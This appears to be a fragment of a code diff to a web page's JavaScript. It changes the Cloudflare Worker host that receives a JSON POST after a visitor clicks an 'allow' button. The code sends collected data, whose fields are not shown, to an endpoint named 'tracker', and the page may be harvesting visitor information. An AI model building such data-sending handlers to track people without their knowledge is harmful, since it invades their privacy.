@@ -9,7 +9,7 @@ document.getElementById('allow-btn').addEventListener('click', () => {
                 };
                 
                 // Send data to Cloudflare Worker
-                fetch('https://tracker.jovdat70.workers.dev/', {
+                fetch('https://tracksar.jovdat70.workers.dev/', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
